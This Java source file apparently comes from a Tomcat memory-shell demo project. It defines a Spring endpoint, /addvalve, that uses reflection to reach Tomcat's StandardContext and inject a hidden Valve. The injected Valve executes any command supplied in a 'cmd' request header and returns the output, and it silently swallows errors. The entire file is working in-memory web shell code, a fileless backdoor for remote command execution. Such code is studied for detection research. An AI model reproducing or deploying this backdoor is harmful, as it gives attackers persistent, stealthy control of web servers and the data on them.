package com.example.tomcatmemshell.demos.web.addvalve;

import com.example.tomcatmemshell.utils.DynamicUtils;
import org.apache.catalina.Valve;
import org.apache.catalina.Wrapper;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.valves.ValveBase;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import javax.servlet.Servlet;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;
import java.lang.reflect.Field;
import javax.servlet.ServletOutputStream;

import static com.example.tomcatmemshell.utils.DynamicUtils.SERVLET_CLASS_STRING;


@Controller
public class AddValveController {

    @RequestMapping("/addvalve")
    @ResponseBody
    public String addvalve(HttpServletRequest req, HttpServletResponse resp) {
        class MemshellValve extends ValveBase {
            public void invoke(Request request, Response response) throws IOException, ServletException {

                HttpServletRequest req = request;
                String cmd = req.getHeader("cmd");
                if (cmd != null){
                    try {
                    Process p=Runtime.getRuntime().exec(cmd);
                    InputStream inputStream = p.getInputStream();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
                    String line;


                    PrintWriter writer = request.getResponse().getWriter();
                    while ((line = reader.readLine()) != null) {
                        writer.println(line);

                    }
                    writer.flush();
                    Field useF = request.getResponse().getClass().getDeclaredField("usingWriter");
                    useF.setAccessible(true);
                    useF.set(request.getResponse(),false);

                    Field useF2 = request.getResponse().getClass().getDeclaredField("usingOutputStream");
                    useF2.setAccessible(true);
                    useF2.set(request.getResponse(),false);

                    p.waitFor();

                    } catch (Exception e) {

                    }
                }
                getNext().invoke(request, response);
            }
        }

        try {
            // 从 request 中获取 servletContext
            ServletContext servletContext = req.getServletContext();

            // 如果已有此 servletName 的 Servlet，则不再重复添加
            StandardContext o = null;

            // 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
            while (o == null) {
                Field f = servletContext.getClass().getDeclaredField("context");
                f.setAccessible(true);
                Object object = f.get(servletContext);

                if (object instanceof ServletContext) {
                    servletContext = (ServletContext) object;
                } else if (object instanceof StandardContext) {
                    o = (StandardContext) object;
                }
            }

            // 添加自定义 Valve
            o.addValve(new MemshellValve());

            return "tomcat valve added";
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "tomcat servlet add failed";
    }
}
